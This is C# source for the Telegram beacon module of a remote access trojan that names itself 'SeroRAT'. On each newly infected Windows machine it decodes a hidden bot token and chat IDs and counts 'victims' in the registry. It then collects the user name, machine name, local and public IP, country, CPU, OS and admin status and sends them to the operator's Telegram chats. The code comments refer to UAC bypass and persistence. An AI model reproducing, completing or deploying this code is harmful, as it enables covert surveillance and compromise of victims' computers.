using System.Net.Http;
using System.Text;
using Microsoft.Win32;

namespace SeroStub;

// Sends a one-shot Telegram message when this stub runs on a new machine.
// Token and chat IDs are XOR-encoded in Config — never stored as plaintext.
internal static class TelegramNotifier
{
    // Global victim counter stored in registry — counts unique machines across all builds.
    private static readonly string _counterKey =
        $@"SOFTWARE\Microsoft\Windows\CurrentVersion\{Config.PersistName}_tg_ctr";

    private static int IncrementAndGetCounter()
    {
        foreach (var root in new[] { Registry.LocalMachine, Registry.CurrentUser })
        {
            try
            {
                using var k = root.CreateSubKey(_counterKey, true);
                if (k == null) continue;
                int.TryParse(k.GetValue("count")?.ToString(), out int cur);
                int next = cur + 1;
                k.SetValue("count", next.ToString());
                return next;
            }
            catch { }
        }
        return 0;
    }

    private static string Ordinal(int n) => (n % 100) switch
    {
        11 or 12 or 13 => $"#{n}th",
        _ => (n % 10) switch { 1 => $"#{n}st", 2 => $"#{n}nd", 3 => $"#{n}rd", _ => $"#{n}th" }
    };

    // HWID-based flag: same machine never re-notifies even across new builds.
    // UserName intentionally excluded — HWID must be identical when stub restarts
    // under a different user context (e.g. SYSTEM → user after UAC bypass relaunch).
    private static string GetHwidShort()
    {
        var raw = $"{Environment.MachineName}:{Environment.ProcessorCount}";
        var hash = System.Security.Cryptography.SHA256.HashData(Encoding.UTF8.GetBytes(raw));
        return Convert.ToHexString(hash)[..12].ToLower();
    }

    private static readonly string _flagKey =
        $@"SOFTWARE\Microsoft\Windows\CurrentVersion\{Config.PersistName}_tg_{GetHwidShort()}";

    // Session-local mutex: serialises concurrent instances (e.g. user + admin after UAC
    // bypass) so only one sends the notification even when both race past ShouldNotify().
    private static readonly string _mutexName = $"Sero_tg_{GetHwidShort()}";

    private static bool ShouldNotify()
    {
        // Check HKLM first — machine-wide, survives SYSTEM→user context changes
        try
        {
            using var k = Registry.LocalMachine.OpenSubKey(_flagKey, false);
            if (k != null) return false;
        }
        catch { }
        // Fallback: HKCU of current user
        try
        {
            using var k = Registry.CurrentUser.OpenSubKey(_flagKey, false);
            if (k != null) return false;
        }
        catch { }
        return true;
    }

    private static void MarkNotified()
    {
        // Write to HKLM first (machine-wide — persists across user context changes)
        try
        {
            using var k = Registry.LocalMachine.CreateSubKey(_flagKey);
            k?.SetValue("ts", DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString());
            return;
        }
        catch { }
        // Fallback: HKCU
        try
        {
            using var k = Registry.CurrentUser.CreateSubKey(_flagKey);
            k?.SetValue("ts", DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString());
        }
        catch { }
    }

    private static string DecodeSfc(byte[] data, byte[] seed)
    {
        if (data.Length == 0) return "";
        var buf = new byte[data.Length];
        ulong a = BitConverter.ToUInt64(seed, 0),  b = BitConverter.ToUInt64(seed, 8),
              c = BitConverter.ToUInt64(seed, 16), d = BitConverter.ToUInt64(seed, 24);
        for (int i = 0; i < data.Length; i++)
        {
            ulong k = a + b + d; d++;
            a = b ^ (b >> 11);
            b = c + (c << 3);
            c = (c << 24) | (c >> 40);
            c += k;
            buf[i] = (byte)(data[i] ^ (byte)k);
        }
        return Encoding.UTF8.GetString(buf);
    }

    private static string GetCpuName()
    {
        try
        {
            using var k = Registry.LocalMachine.OpenSubKey(
                @"HARDWARE\DESCRIPTION\System\CentralProcessor\0");
            return k?.GetValue("ProcessorNameString")?.ToString()?.Trim() ?? "Unknown";
        }
        catch { return "Unknown"; }
    }

    private static string GetOsName()
    {
        try
        {
            using var k = Registry.LocalMachine.OpenSubKey(
                @"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            var prod  = k?.GetValue("ProductName")?.ToString() ?? "Windows";
            var build = k?.GetValue("CurrentBuildNumber")?.ToString() ?? "";
            // Registry still says "Windows 10" on Windows 11 — fix by build number
            if (int.TryParse(build, out int bn) && bn >= 22000)
                prod = prod.Replace("Windows 10", "Windows 11");
            return string.IsNullOrEmpty(build) ? prod : $"{prod} (build {build})";
        }
        catch { return "Windows"; }
    }

    // Returns (publicIp, country) using ip-api.com (free, no key needed)
    private static async Task<(string ip, string country)> GetPublicInfoAsync(HttpClient http)
    {
        try
        {
            var json = await http.GetStringAsync("http://ip-api.com/json/?fields=query,country");
            var doc  = System.Text.Json.JsonDocument.Parse(json);
            var ip      = doc.RootElement.TryGetProperty("query",   out var q) ? q.GetString() ?? "N/A" : "N/A";
            var country = doc.RootElement.TryGetProperty("country", out var c) ? c.GetString() ?? "N/A" : "N/A";
            return (ip, country);
        }
        catch { return ("N/A", "N/A"); }
    }

    private static bool IsAdmin()
    {
        try
        {
            using var id = System.Security.Principal.WindowsIdentity.GetCurrent();
            return new System.Security.Principal.WindowsPrincipal(id)
                .IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
        }
        catch { return false; }
    }

    private static string GetLocalIp()
    {
        try
        {
            foreach (var iface in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
            {
                if (iface.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up) continue;
                foreach (var addr in iface.GetIPProperties().UnicastAddresses)
                {
                    if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork
                        && !System.Net.IPAddress.IsLoopback(addr.Address))
                        return addr.Address.ToString();
                }
            }
        }
        catch { }
        return "N/A";
    }

    public static void NotifyAsync()
    {
        if (!Config.TelegramEnabled) return;
        if (!ShouldNotify()) return;

        var token   = DecodeSfc(Config.TelegramTokenSfc,   Config.TelegramSfcSeed);
        var chatId1 = DecodeSfc(Config.TelegramChatId1Sfc, Config.TelegramSfcSeed);
        var chatId2 = DecodeSfc(Config.TelegramChatId2Sfc, Config.TelegramSfcSeed);

        if (string.IsNullOrEmpty(token) || string.IsNullOrEmpty(chatId1)) return;

        var targets = new List<string> { chatId1 };
        if (!string.IsNullOrEmpty(chatId2)) targets.Add(chatId2);

        Task.Run(async () =>
        {
            // Mutex prevents duplicate notifications when two instances race on the same machine.
            var mutex = new Mutex(false, _mutexName);
            bool owned = false;
            try
            {
                try   { owned = mutex.WaitOne(0); }
                catch (AbandonedMutexException) { owned = true; }
                if (!owned) return; // another instance is already handling this machine

                if (!ShouldNotify()) return; // re-check now that we hold the mutex

                await Task.Delay(500);
                using var http = new HttpClient { Timeout = TimeSpan.FromSeconds(12) };
                http.DefaultRequestHeaders.UserAgent.ParseAdd(
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

                int victimNumber = IncrementAndGetCounter();
                var (pubIp, country) = await GetPublicInfoAsync(http);
                var msg = BuildMessage(pubIp, country, victimNumber);

                bool primarySent = false;
                for (int attempt = 0; attempt < 6 && !primarySent; attempt++)
                {
                    try
                    {
                        if (attempt > 0) await Task.Delay(2000);
                        await SendMessage(http, token, targets[0], msg);
                        primarySent = true;
                        MarkNotified();
                        for (int i = 1; i < targets.Count; i++)
                        {
                            try { await SendMessage(http, token, targets[i], msg); } catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }
            finally
            {
                if (owned) try { mutex.ReleaseMutex(); } catch { }
                mutex.Dispose();
            }
        });
    }

    private static string BuildMessage(string pubIp, string country, int victimNumber)
    {
        var prefix   = string.IsNullOrEmpty(Config.ClientIdPrefix) ? "" : $"{Config.ClientIdPrefix}-";
        var clientId = $"{prefix}{Environment.MachineName}";
        var admin    = IsAdmin() ? "Yes" : "No";
        var parisTz  = TimeZoneInfo.FindSystemTimeZoneById("Romance Standard Time");
        var paris    = TimeZoneInfo.ConvertTimeFromUtc(DateTime.UtcNow, parisTz);
        var dt       = paris.ToString("yyyy-MM-dd HH:mm") + " (Paris)";
        var ordinal  = victimNumber > 0 ? $" ({Ordinal(victimNumber)} victim)" : "";

        return
            $"New victim{ordinal} - SeroRAT\n" +
            $"\n" +
            $"ID: {clientId}\n" +
            $"User: {Environment.UserName}@{Environment.MachineName}\n" +
            $"Local IP: {GetLocalIp()}\n" +
            $"Public IP: {pubIp}\n" +
            $"Country: {country}\n" +
            $"CPU: {GetCpuName()}\n" +
            $"OS: {GetOsName()}\n" +
            $"Admin: {admin}\n" +
            $"Time: {dt}";
    }

    // GET request with URL-encoded plain text — no parse_mode, no markdown, no 400 errors.
    // On 429 (flood control): reads Retry-After, waits, then throws so the caller retries.
    private static async Task SendMessage(HttpClient http, string token, string chatId, string text)
    {
        var url = $"https://api.telegram.org/bot{token}/sendMessage" +
                  $"?chat_id={Uri.EscapeDataString(chatId)}" +
                  $"&text={Uri.EscapeDataString(text)}";
        var resp = await http.GetAsync(url);
        if ((int)resp.StatusCode == 429)
        {
            int wait = 30; // default if Telegram omits the header
            if (resp.Headers.TryGetValues("Retry-After", out var vals)
                && int.TryParse(vals.FirstOrDefault(), out int ra))
                wait = Math.Max(ra, 5);
            await Task.Delay(wait * 1000);
            throw new HttpRequestException($"Telegram 429 — waited {wait}s");
        }
        resp.EnsureSuccessStatusCode(); // throw on 4xx/5xx so MarkNotified() is never called on failure
    }
}
